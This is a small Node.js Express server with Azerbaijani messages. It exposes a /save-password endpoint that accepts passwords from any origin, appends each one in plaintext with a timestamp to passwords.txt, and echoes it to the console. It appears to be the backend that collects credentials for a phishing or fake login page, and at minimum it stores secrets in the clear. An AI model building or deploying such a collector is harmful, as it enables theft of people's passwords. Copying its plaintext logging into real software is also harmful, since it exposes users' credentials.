const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 5000;

app.use(cors());
app.use(express.json());

app.post("/save-password", (req, res) => {
  const { password } = req.body;

  if (!password) {
    return res.status(400).json({ error: "Şifrə göndərilməyib" });
  }

  const logLine = `Password: ${password} - Time: ${new Date().toISOString()}\n`;
  const filePath = path.join(__dirname, "passwords.txt");

  fs.appendFile(filePath, logLine, (err) => {
    if (err) {
      console.error("Yazmaq mümkün olmadı:", err);
      return res.status(500).json({ error: "Fayla yazmaq mümkün olmadı" });
    }

    console.log("Yeni şifrə yazıldı:", password);
    res.status(200).json({ message: "Şifrə qeyd edildi" });
  });
});

app.get("/", (req, res) => {
  res.send("Server işləyir");
});

app.listen(PORT, () => {
  console.log(`✅ Server işləyir: http://localhost:${PORT}`);
});